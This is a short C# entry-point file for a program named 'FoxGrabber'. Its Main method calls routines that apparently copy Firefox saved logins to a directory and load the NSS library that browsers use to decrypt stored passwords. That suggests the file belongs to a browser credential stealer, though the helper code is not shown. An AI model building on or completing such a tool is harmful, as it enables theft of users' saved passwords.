namespace FoxGrabber
{
    using System;

    internal static partial class Program
    {
        private static void Main()
        {
            Searcher.CopyLoginsInSafeDir();
            LoaderDLL.GetNSSLibrary();
            Console.ReadLine();
        }
    }
}